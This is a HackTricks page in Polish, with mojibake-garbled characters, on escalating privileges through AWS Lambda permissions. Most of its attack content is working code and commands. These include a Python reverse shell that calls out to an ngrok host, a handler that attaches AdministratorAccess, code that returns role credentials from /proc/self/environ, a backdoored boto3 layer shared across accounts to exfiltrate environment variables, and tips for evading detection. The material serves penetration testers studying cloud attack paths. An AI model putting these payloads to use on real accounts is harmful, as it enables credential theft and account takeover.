# AWS - Eskalacja uprawnieÅ„ w Lambda

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## lambda

WiÄ™cej informacji na temat lambdy znajdziesz w:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

UÅ¼ytkownicy posiadajÄ…cy uprawnienia **`iam:PassRole`, `lambda:CreateFunction` i `lambda:InvokeFunction`** mogÄ… eskalowaÄ‡ swoje uprawnienia.\
MogÄ… **utworzyÄ‡ nowÄ… funkcjÄ™ Lambda i przypisaÄ‡ jej istniejÄ…cÄ… rolÄ™ IAM**, nadajÄ…c funkcji uprawnienia zwiÄ…zane z tÄ… rolÄ…. UÅ¼ytkownik moÅ¼e nastÄ™pnie **napisaÄ‡ i przesÅ‚aÄ‡ kod do tej funkcji Lambda (na przykÅ‚ad z odwrÃ³conym powÅ‚okiem)**.\
Gdy funkcja jest skonfigurowana, uÅ¼ytkownik moÅ¼e **wywoÅ‚aÄ‡ jej wykonanie** i zamierzone dziaÅ‚ania, wywoÅ‚ujÄ…c funkcjÄ™ Lambda za poÅ›rednictwem interfejsu API AWS. Ten sposÃ³b pozwala uÅ¼ytkownikowi efektywnie wykonywaÄ‡ zadania poÅ›rednio za poÅ›rednictwem funkcji Lambda, dziaÅ‚ajÄ…c na poziomie dostÄ™pu przyznanego roli IAM z niÄ… zwiÄ…zanej.\\

AtakujÄ…cy mÃ³gÅ‚by wykorzystaÄ‡ to do uzyskania **odwrÃ³conej powÅ‚oki i kradzieÅ¼y tokena**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
MoÅ¼esz rÃ³wnieÅ¼ **naduÅ¼yÄ‡ uprawnieÅ„ roli lambdy** bezpoÅ›rednio z funkcji lambdy.\
JeÅ›li rola lambdy miaÅ‚a wystarczajÄ…ce uprawnienia, moÅ¼esz ich uÅ¼yÄ‡ do przyznania sobie uprawnieÅ„ administratora:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
MoÅ¼liwe jest rÃ³wnieÅ¼ ujawnienie poÅ›wiadczeÅ„ roli lambdy bez koniecznoÅ›ci zewnÄ™trznego poÅ‚Ä…czenia. ByÅ‚oby to przydatne dla **Lambd z izolacjÄ… sieciowÄ…** uÅ¼ywanych do zadaÅ„ wewnÄ™trznych. JeÅ›li nieznane grupy zabezpieczeÅ„ filtrowujÄ… twoje odwrÃ³cone powÅ‚oki, ten fragment kodu pozwoli ci bezpoÅ›rednio ujawniÄ‡ poÅ›wiadczenia jako wynik lambdy.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencjalny wpÅ‚yw:** BezpoÅ›rednie podniesienie uprawnieÅ„ do okreÅ›lonej roli usÅ‚ugi lambda.

{% hint style="danger" %}
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e nawet jeÅ›li moÅ¼e to wydawaÄ‡ siÄ™ interesujÄ…ce **`lambda:InvokeAsync`**, to **nie** pozwala samodzielnie **wykonaÄ‡ `aws lambda invoke-async`**, potrzebujesz rÃ³wnieÅ¼ `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Podobnie jak w poprzednim scenariuszu, moÅ¼esz **przyznaÄ‡ sobie uprawnienie `lambda:InvokeFunction`** jeÅ›li masz uprawnienie **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do okreÅ›lonej roli usÅ‚ugi Lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

UÅ¼ytkownicy posiadajÄ…cy uprawnienia **`iam:PassRole`, `lambda:CreateFunction` oraz `lambda:CreateEventSourceMapping`** (i potencjalnie `dynamodb:PutItem` oraz `dynamodb:CreateTable`) mogÄ… poÅ›rednio **podnieÅ›Ä‡ uprawnienia**, nawet bez `lambda:InvokeFunction`.\
MogÄ… utworzyÄ‡ funkcjÄ™ **Lambda z zÅ‚oÅ›liwym kodem i przypisaÄ‡ jej istniejÄ…cÄ… rolÄ™ IAM**.

Zamiast bezpoÅ›redniego wywoÅ‚ywania funkcji Lambda, uÅ¼ytkownik konfiguruje lub wykorzystuje istniejÄ…cÄ… tabelÄ™ DynamoDB, Å‚Ä…czÄ…c jÄ… z LambdÄ… poprzez mapowanie ÅºrÃ³dÅ‚a zdarzeÅ„. Ta konfiguracja zapewnia, Å¼e funkcja Lambda jest **automatycznie wyzwalana po dodaniu nowego elementu** do tabeli, zarÃ³wno przez dziaÅ‚anie uÅ¼ytkownika, jak i inny proces, co poÅ›rednio wywoÅ‚uje funkcjÄ™ Lambda i wykonuje kod z uprawnieniami przekazanej roli IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
JeÅ›li DynamoDB jest juÅ¼ aktywny w Å›rodowisku AWS, uÅ¼ytkownik musi jedynie **ustanowiÄ‡ mapowanie ÅºrÃ³dÅ‚a zdarzeÅ„** dla funkcji Lambda. JednakÅ¼e, jeÅ›li DynamoDB nie jest uÅ¼ywany, uÅ¼ytkownik musi **utworzyÄ‡ nowÄ… tabelÄ™** z wÅ‚Ä…czonym strumieniowaniem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Teraz jest moÅ¼liwe **poÅ‚Ä…czenie funkcji Lambda z tabelÄ… DynamoDB** poprzez **utworzenie mapowania ÅºrÃ³dÅ‚a zdarzeÅ„**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Z funkcjÄ… Lambda poÅ‚Ä…czonÄ… ze strumieniem DynamoDB, atakujÄ…cy moÅ¼e **poÅ›rednio uruchomiÄ‡ funkcjÄ™ Lambda aktywujÄ…c strumieÅ„ DynamoDB**. MoÅ¼na to osiÄ…gnÄ…Ä‡ przez **wstawienie elementu** do tabeli DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do okreÅ›lonej roli usÅ‚ugi lambda.

### `lambda:AddPermission`

AtakujÄ…cy posiadajÄ…cy te uprawnienia moÅ¼e **przyznaÄ‡ sobie (lub innym) dowolne uprawnienia** (co generuje polityki oparte na zasobach w celu przyznania dostÄ™pu do zasobu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli usÅ‚ugi lambda poprzez nadanie uprawnienia do modyfikacji kodu i jego uruchamiania.

### `lambda:AddLayerVersionPermission`

AtakujÄ…cy posiadajÄ…cy to uprawnienie moÅ¼e **nadaÄ‡ sobie (lub innym) uprawnienie `lambda:GetLayerVersion`**. MoÅ¼e uzyskaÄ‡ dostÄ™p do warstwy i wyszukiwaÄ‡ podatnoÅ›ci lub poufne informacje.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencjalne skutki:** Potencjalny dostÄ™p do poufnych informacji.

### `lambda:UpdateFunctionCode`

UÅ¼ytkownicy posiadajÄ…cy uprawnienie **`lambda:UpdateFunctionCode`** majÄ… potencjaÅ‚ do **modyfikacji kodu istniejÄ…cej funkcji Lambda powiÄ…zanej z rolÄ… IAM.**\
AtakujÄ…cy moÅ¼e **zmodyfikowaÄ‡ kod lambdy w celu wycieku poÅ›wiadczeÅ„ IAM**.

Mimo Å¼e atakujÄ…cy moÅ¼e nie mieÄ‡ bezpoÅ›redniej moÅ¼liwoÅ›ci wywoÅ‚ania funkcji, jeÅ›li funkcja Lambda jest juÅ¼ istniejÄ…ca i operacyjna, jest prawdopodobne, Å¼e zostanie uruchomiona poprzez istniejÄ…ce przepÅ‚ywy pracy lub zdarzenia, uÅ‚atwiajÄ…c tym samym wykonanie zmodyfikowanego kodu.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli usÅ‚ugi lambda uÅ¼ywanej.

### `lambda:UpdateFunctionConfiguration`

#### Wprowadzenie

[**Warstwy Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) pozwalajÄ… na doÅ‚Ä…czenie **kodu** do funkcji lambda, ale **przechowywanie go osobno**, dziÄ™ki czemu kod funkcji moÅ¼e pozostaÄ‡ niewielki, a **kilka funkcji moÅ¼e wspÃ³Å‚dzieliÄ‡ kod**.

WewnÄ…trz lambdy moÅ¼na sprawdziÄ‡ Å›cieÅ¼ki, z ktÃ³rych Å‚adowany jest kod Python za pomocÄ… funkcji takiej jak poniÅ¼sza:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Oto miejsca:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na przykÅ‚ad, biblioteka boto3 jest Å‚adowana z `/var/runtime/boto3` (4. pozycja).

#### Wykorzystanie

**DoÅ‚Ä…czenie warstwy do funkcji** wymaga jedynie uprawnienia `lambda:UpdateFunctionConfiguration`, a **warstwy mogÄ… byÄ‡ udostÄ™pniane miÄ™dzy kontami**. MusielibyÅ›my rÃ³wnieÅ¼ wiedzieÄ‡, **jakie biblioteki sÄ… uÅ¼ywane**, abyÅ›my mogli je poprawnie nadpisaÄ‡, ale w tym przykÅ‚adzie **zaÅ‚oÅ¼ymy, Å¼e atakowana funkcja importuje boto3**.

Dla pewnoÅ›ci, uÅ¼yjemy Pipy, aby zainstalowaÄ‡ tÄ™ samÄ… wersjÄ™ biblioteki boto3 z czasu uruchomienia Lambdy, na ktÃ³rÄ… siÄ™ skupiamy (Python 3.7), aby nie byÅ‚o niczego innego, co mogÅ‚oby powodowaÄ‡ problemy w funkcji docelowej. Obecnie czas uruchomienia uÅ¼ywa wersji boto3 1.9.42.

Z poniÅ¼szym kodem zainstalujemy bibliotekÄ™ boto3 w wersji 1.9.42 i jej zaleÅ¼noÅ›ci do lokalnego folderu "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
NastÄ™pnie otworzymy `/lambda_layer/boto3/__init__.py` i dodamy zÅ‚oÅ›liwy kod. Payload, ktÃ³ry dodamy, wyglÄ…da tak:

![](<../../../.gitbook/assets/image (26).png>)

`requests` jest importowany z `botocore`. Funkcja bÄ™dzie eksfiltrowaÄ‡ zmienne Å›rodowiskowe, a try-except oraz 0.1 timeout majÄ… zapewniÄ‡, Å¼e ten kod nie spowoduje awarii.

{% hint style="info" %}
**WaÅ¼na uwaga:** Nie powinieneÅ› juÅ¼ uÅ¼ywaÄ‡ `from botocore.vendored import requests` podczas rzeczywistych testÃ³w penetracyjnych, poniewaÅ¼ w dziennikach CloudWatch tej funkcji zostanie wydrukowane ostrzeÅ¼enie o deprecjacji, co prawdopodobnie spowoduje, Å¼e zostaniesz wykryty przez obroÅ„cÄ™.
{% endhint %}

Teraz spakuj ten kod do pliku **ZIP** i **zaÅ‚aduj** go do **nowej warstwy Lambda w koncie ATAKUJÄ„CEGO**. Najpierw musisz utworzyÄ‡ folder â€pythonâ€ i umieÅ›ciÄ‡ w nim swoje biblioteki, aby po zaÅ‚adowaniu ich do Lambdy kod moÅ¼na byÅ‚o znaleÅºÄ‡ pod â€/opt/python/boto3â€. Upewnij siÄ™ rÃ³wnieÅ¼, Å¼e warstwa jest zgodna z Pythonem 3.7 i Å¼e **warstwa znajduje siÄ™ w tym samym regionie co nasza funkcja docelowa**. Gdy to zrobisz, uÅ¼yj `lambda:AddLayerVersionPermission`, aby **udostÄ™pniÄ‡ warstwÄ™ publicznie**, dziÄ™ki czemu nasze konto docelowe bÄ™dzie mogÅ‚o z niej korzystaÄ‡. UÅ¼yj swoich osobistych poÅ›wiadczeÅ„ AWS do tego wywoÅ‚ania API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Teraz, z **skompromitowanymi poÅ›wiadczeniami**, ktÃ³re posiadamy, uruchomimy nastÄ™pujÄ…ce polecenie na naszej docelowej funkcji Lambda "s3-getter", ktÃ³re **doÅ‚Ä…czy naszÄ… warstwÄ™ Lambda miÄ™dzykontowÄ…**.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
NastÄ™pnym krokiem bÄ™dzie albo **wywoÅ‚anie funkcji** samodzielnie, jeÅ›li jest to moÅ¼liwe, albo oczekiwanie, aÅ¼ zostanie **wywoÅ‚ana** w normalny sposÃ³b - co jest bezpieczniejszÄ… metodÄ….

**Bardziej skrytym sposobem na wykorzystanie tej podatnoÅ›ci** moÅ¼na znaleÅºÄ‡ w:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli usÅ‚ugi lambda uÅ¼ywanej.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

MoÅ¼e byÄ‡ moÅ¼liwe utworzenie funkcji i jej wykonanie, wywoÅ‚ujÄ…c URL... ale nie mogÅ‚em znaleÅºÄ‡ sposobu, aby to przetestowaÄ‡, wiÄ™c daj mi znaÄ‡, jeÅ›li uda Ci siÄ™ to zrobiÄ‡!

### Lambda MitM

NiektÃ³re lambdy bÄ™dÄ… **otrzymywaÄ‡ wraÅ¼liwe informacje od uÅ¼ytkownikÃ³w w parametrach.** JeÅ›li uzyskasz RCE w jednej z nich, moÅ¼esz wyciekaÄ‡ informacje, ktÃ³re inni uÅ¼ytkownicy wysyÅ‚ajÄ… do niej, sprawdÅº to w:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## OdnoÅ›niki

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
